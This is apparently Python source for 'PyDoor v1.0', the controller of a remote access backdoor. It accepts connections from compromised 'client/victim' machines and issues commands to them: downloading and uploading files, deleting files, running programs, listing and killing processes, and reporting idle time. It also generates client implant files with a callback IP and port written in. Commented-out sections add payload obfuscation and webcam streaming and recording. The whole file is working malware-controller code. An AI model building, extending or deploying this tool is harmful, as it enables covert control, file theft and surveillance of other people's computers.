import socket
import sys
import os
import threading
import ntpath
from queue import Queue
# from keyboard import press
import time
# import sys
import cv2
import pickle
import struct

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []
connected = False


def split_path(path):
    head, tail = ntpath.split(path)
    return tail or ntpath.basename(head)


# Create a Socket ( connect two computers)
def create_socket():
    try:
        global connected
        global host
        global port
        global s

        print("\nPORT LISTENING CONFIGURATION:")
        print("------------------------------\n")

        host = str(input("[~] Enter the server (host) IP address (press ENTER if you want to skip this configuration): "))             #"10.9.117.170"  # OpenVPN IP

        if host == "":
            connected = True
            print("\n[!] Warning: You skipped port listening configuration.\n[!] You won't be able to select or connect to clients if you didn't set it up before\n[!] Type 'listen' in PyDoor console to configure port listening again\n")
        else:
            connected = False
        while not connected:
            try:
                port = int(input("\n[~] Port number to listen on: "))
                break
            except:
                print("\n[-] Entered port is not integer")

        if host != "":
            print("\n[~] Creating socket...")
            s = socket.socket()
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            print("\n[+] Socket successfully created\n")


    except socket.error as msg:
        print("\n[-] Socket creation error: " + str(msg) + "\n")


# Binding the socket and listening for connections
def bind_socket():
    global connected
    global host
    global port
    global s
    attempts = 0
    while True:
        try:
            if host != "":
                print("[~] Connecting to: "+host+" ...")
                s.bind((host, port))
                print("\n[+] Successfully connected to: "+str(host)+"\n")
                s.listen(5)
                connected = True
                break
            else:
                connected = True
                break
        except socket.error as msg:
            if attempts < 2:
                print("\n[-] Could not connect to: "+host+".\n\n[!] Error message: '" + str(msg) + "'\n")
                print("[~] Reconnecting in 2 seconds...\n")
                print("-----------------------------------\n")
                time.sleep(2)
                attempts += 1
            elif attempts == 2:
                reconnect = str(input("\nContinue reconnecting? (Y/N): "))
                print("")
                if reconnect.startswith("y") or reconnect.startswith("Y"):
                    bind_socket()
                elif reconnect.startswith("n") or reconnect.startswith("N"):
                    attempts = 0
                    create_socket()
                else:
                    attempts = 0
                    print("\n[-] Bad response\n")
                    create_socket()



# Handling connection from multiple clients and saving to a list
# Closing previous connections when server.py file is restarted

def accepting_connections():
    global host
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while host != "":
            try:
                conn, address = s.accept()
                s.setblocking(True)  # prevents timeout

                all_connections.append(conn)
                all_address.append(address)

                print("[+] Client with IP: "+address[0] + " has connected")
                #press('enter')

            except:
                print("\n[-] Problem during accepting connections\n")




# Display all current active connections with client

def generate_client_file():
    script_name = str(input("Enter the name for the client file (with .py extension): "))
    host = str(input("\nIP for the client file: "))
    port = str(input("\nPort for the client file: "))
    client_script = open("client_script.txt", "r")
    client_script_content = client_script.read()
    client_script.close()

    python_file = open(script_name, "w+")
    python_file.write("HOST = '"+host+"'\nPORT = int("+port+")\n")
    python_file.write(client_script_content)
    python_file.close()
    print("\nFile created successfully\n")



def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            command = "status_check"
            conn.send(command.encode())
            conn.recv(2048)

        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = "ID: " + str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

    print("\n------Clients------" + "\n" + results)


# Select connected client
def select_client(cmd):
    try:
        global id
        id = cmd.replace('select ', '')  # target = id
        id = int(id)
        conn = all_connections[id]
        print("\n[+] You are now connected to: " + str(all_address[id][0]) + "\n")
        return conn

    except:
        print("\n[-] Invalid ID: check IDs by typing 'ls'\n")
        return None


def pydoor_console():
    global connected
    if connected:
        while True:
            cmd = input('PyDoor > ')

            if cmd == 'ls':
                list_connections()

            elif cmd == 'help':
                print('''               
PyDoor Console - All available console commands:

"Command" -- Description
-----------------------
"generate" -- client file generator. You will have to specify name, server and port for client file.
"help" - help for PyDoor console.
"listen" - port listening configuration.
"ls" -- lists all connected clients and shows their IDs.
"select [ID]" -- select client with specified ID that exists on client list ("ls").
"version" -- show current PyDoor version.
                        ''')

            elif 'select' in cmd:
                conn = select_client(cmd)
                if conn is not None:
                    execute_commands(conn)
            elif 'listen' in cmd:
                create_workers()
                create_jobs()

            # elif "obfuscate" in cmd:
            #     try:
            #         print("\n[~] Obfuscating in progress...\n")
            #         user_input = cmd.replace('obfuscate ', '')
            #         os.system('start /wait cmd /c pyarmor pack -e " --onefile" '+user_input)
            #         if os.path.exists(os.getcwd()+'//dist//'):
            #             print("\n[+] File obfuscation process completed\n")
            #         else:
            #             print("\n[-] Problem during file obfuscation process\n")
            #     except:
            #         print("\n[-] Problem during file obfuscation process")

            elif cmd == 'version':
                print("\nPyDoor v1.0 by Kammelleon\n")

            elif cmd == 'generate':
                generate_client_file()

            elif '' == cmd:
                continue

            else:
                print("\n[!] " + cmd + " command not recognized\n")


    else:
        time.sleep(1)
        pydoor_console()


# Send commands to client/victim or a friend
def execute_commands(conn):
    while True:
            command = input(str("Command >> "))
            if command == "pwd":
                try:
                    conn.send(command.encode())
                except:
                    print("\n[-] Error while sending commands (is client still online?)")
                print("\n[~] Waiting for execution... \n")
                get_cwd = conn.recv(4096)
                get_cwd = get_cwd.decode()
                print(get_cwd)

            elif "cd" in command:
                try:
                    conn.send(command.encode())
                except:
                    print("\n[-] Error while sending commands (is client still online?)")
                print("")
                user_input = command.replace('cd ', '')
                conn.send(user_input.encode())
                print("\n[~] Waiting for execution... \n")
                response = conn.recv(4096)
                response = response.decode()
                print(response)
            elif "download" in command:
                try:
                    conn.send(command.encode())
                except:
                    print("\n[-] Error while sending commands (is client still online?)")
                print("\n[~] Waiting for execution... \n")
                filepath = command.replace('download ', '')
                conn.send(filepath.encode())
                file = conn.recv(100000)
                if file == b'ErrorFileNotFound':
                    print("\n[-] File not found\n")
                else:
                    filename = split_path(filepath)
                    new_file = open(filename, "wb")
                    new_file.write(file)
                    new_file.close()
                    print("\n[+]" + filename, " has been downloaded and saved to: " + os.getcwd() + "\n")

            elif command == "ls":
                try:
                    try:
                        conn.send(command.encode())
                    except:
                        print("\n[-] Error while sending commands (is client still online?)")
                    print("\n[~] Waiting for execution... \n")
                    files = conn.recv(4096)
                    files = files.decode()
                    print(files)
                except Exception:
                    continue

            elif command == "cd ..":
                try:
                    conn.send(command.encode())
                except:
                    print("\n[-] Error while sending commands (is client still online?)")
                print("\n[~] Waiting for execution... \n")
                get_cwd = conn.recv(8192)
                get_cwd = get_cwd.decode()
                print("[+] Current path:\n", get_cwd)

            elif "rm" in command:
                try:
                    conn.send(command.encode())
                except:
                    print("\n[-] Error while sending commands (is client still online?)")
                print("\n[~] Waiting for execution... \n")
                file = command.replace('rm ', '')
                conn.send(file.encode())
                msg = conn.recv(8192)
                msg = msg.decode()
                print(msg)

            elif "upload" in command:
                try:
                    conn.send(command.encode())
                except:
                    print("\n[-] Error while sending commands (is client still online?)")
                print("\n[~] Waiting for execution... \n")
                file = command.replace('upload ', '')
                filename = str(file)
                conn.send(filename.encode() + b'FILECONTENT')
                data = open(file, "rb")
                file_data = data.read(8192)
                conn.send(file_data)
                msg = conn.recv(2048)
                msg = msg.decode()
                print(msg)

            elif command == "info":
                try:
                    conn.send(command.encode())
                except:
                    print("\n[-] Error while sending commands (is client still online?)")
                print("\n[~] Waiting for execution... \n")
                msg = conn.recv(2048)
                msg = msg.decode()
                print(msg)
            elif command == "ifconfig":
                try:
                    conn.send(command.encode())
                except:
                    print("\n[-] Error while sending commands (is client still online?)")
                print("\n[~] Waiting for execution... \n")
                msg = conn.recv(4096)
                msg = msg.decode()
                print(msg)

            # elif command == "webcam_stream":
            #         try:
            #             conn.send(command.encode())
            #         except:
            #             print("\n[-] Error while sending commands (is client still online?)")
            #         print("\n[~] Waiting for execution... \n")
            #         data = conn.recv(2000)
            #         payload_size = struct.calcsize(">L")
            #         while b'bad' not in data:
            #             print(data)
            #             while len(data) < payload_size:
            #                 print("Recv: {}".format(len(data)))
            #                 data += conn.recv(4096)
            #             if (len(data)) == 3:
            #                 break
            #             print("Done Recv: {}".format(len(data)))
            #             packed_msg_size = data[:payload_size]
            #
            #             data = data[payload_size:]
            #             msg_size = struct.unpack(">L", packed_msg_size)[0]
            #             print("msg_size: {}".format(msg_size))
            #
            #             while len(data) < msg_size:
            #                 data += conn.recv(4096)
            #             frame_data = data[:msg_size]
            #             data = data[msg_size:]
            #
            #             frame = pickle.loads(frame_data, fix_imports=True, encoding="bytes")
            #             frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
            #             cv2.imshow('Webcam stream (press "q" to close the window)', frame)
            #             if cv2.waitKey(1) & 0xFF == ord('q'):
            #                 conn.send(b"BREAK")
            #                 cv2.destroyWindow('Webcam stream (press "q" to close the window)')
            #
            #                 break
            #
            #
            #         if b'bad' in data:
            #             print("ERR")
            #             break

            elif "run" in command:
                try:
                    conn.send(command.encode())
                except:
                    print("\n[-] Error while sending commands (is client still online?)")
                print("\n[~] Waiting for execution... \n")
                file = command.replace('run ', '')
                conn.send(file.encode())
                msg = conn.recv(2048)
                msg = msg.decode()
                print(msg)

            elif command == "ps":
                try:
                    conn.send(command.encode())
                except:
                    print("\n[-] Error while sending commands (is client still online?)")
                print("\n[~] Waiting for execution... \n")
                msg = conn.recv(16384)
                msg = msg.decode()
                print(msg)

            elif "kill" in command:
                try:
                    conn.send(command.encode())
                except:
                    print("\n[-] Error while sending commands (is client still online?)")
                print("\n[~] Waiting for execution... \n")
                process = command.replace('kill ', '')
                conn.send(process.encode())
                msg = conn.recv(2048)
                msg = msg.decode()
                print(msg)

            # elif "record" in command:
            #     conn.send(command.encode())
            #     name = command.replace('record ', '')
            #     conn.send(name.encode())
            #     file = conn.recv(10000000)
            #     if file == b'ErrorFileNotFound':
            #         print("\n[-] File not found\n")
            #     else:
            #         filename = split_path(name)
            #         new_file = open(filename, "wb")
            #         new_file.write(file)
            #         new_file.close()
            #         print("\n[+] " + filename, " has been downloaded and saved to: " + os.getcwd() + "\n")

            elif command == "idletime":
                try:
                    conn.send(command.encode())
                except:
                    print("\n[-] Error while sending commands (is client still online?)")
                print("\n[~] Waiting for execution... \n")
                msg = conn.recv(2048)
                msg = msg.decode()
                print(msg)

            elif command == "exit":
                break

            elif command == "":
                continue

            else:
                print("\n[!] '" + command + "'" + " command not recognized\n")




# Create worker threads
def create_workers():
    global connected
    connected = False
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()

        if x == 2:
            pydoor_console()

        queue.task_done()

# Put jobs into queue
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


if __name__ == "__main__":
    print(''' 


    PPPPPPPPPPPPPPPPP                            DDDDDDDDDDDDD                                                              
    P::::::::::::::::P                           D::::::::::::DDD                                                           
    P::::::PPPPPP:::::P                          D:::::::::::::::DD                                                         
    PP:::::P     P:::::P                         DDD:::::DDDDD:::::D                                                        
      P::::P     P:::::Pyyyyyyy           yyyyyyy  D:::::D    D:::::D    ooooooooooo      ooooooooooo   rrrrr   rrrrrrrrr   
      P::::P     P:::::P y:::::y         y:::::y   D:::::D     D:::::D oo:::::::::::oo  oo:::::::::::oo r::::rrr:::::::::r  
      P::::PPPPPP:::::P   y:::::y       y:::::y    D:::::D     D:::::Do:::::::::::::::oo:::::::::::::::or:::::::::::::::::r 
      P:::::::::::::PP     y:::::y     y:::::y     D:::::D     D:::::Do:::::ooooo:::::oo:::::ooooo:::::orr::::::rrrrr::::::r
      P::::PPPPPPPPP        y:::::y   y:::::y      D:::::D     D:::::Do::::o     o::::oo::::o     o::::o r:::::r     r:::::r
      P::::P                 y:::::y y:::::y       D:::::D     D:::::Do::::o     o::::oo::::o     o::::o r:::::r     rrrrrrr
      P::::P                  y:::::y:::::y        D:::::D     D:::::Do::::o     o::::oo::::o     o::::o r:::::r            
      P::::P                   y:::::::::y         D:::::D    D:::::D o::::o     o::::oo::::o     o::::o r:::::r            
    PP::::::PP                  y:::::::y        DDD:::::DDDDD:::::D  o:::::ooooo:::::oo:::::ooooo:::::o r:::::r            
    P::::::::P                   y:::::y         D:::::::::::::::DD   o:::::::::::::::oo:::::::::::::::o r:::::r            
    P::::::::P                  y:::::y          D::::::::::::DDD      oo:::::::::::oo  oo:::::::::::oo  r:::::r            
    PPPPPPPPPP                 y:::::y           DDDDDDDDDDDDD           ooooooooooo      ooooooooooo    rrrrrrr            
                              y:::::y                                                                                       
                             y:::::y                                                                                        
                            y:::::y                                                                                         
                           y:::::y                                                                                          
                          yyyyyyy                                             
                                                                        

---------------------------------------------------------------------------------------------------------------------------------
    ''')
    print("PyDoor v1.0 by: Kamelleon\n")
    create_workers()
    create_jobs()
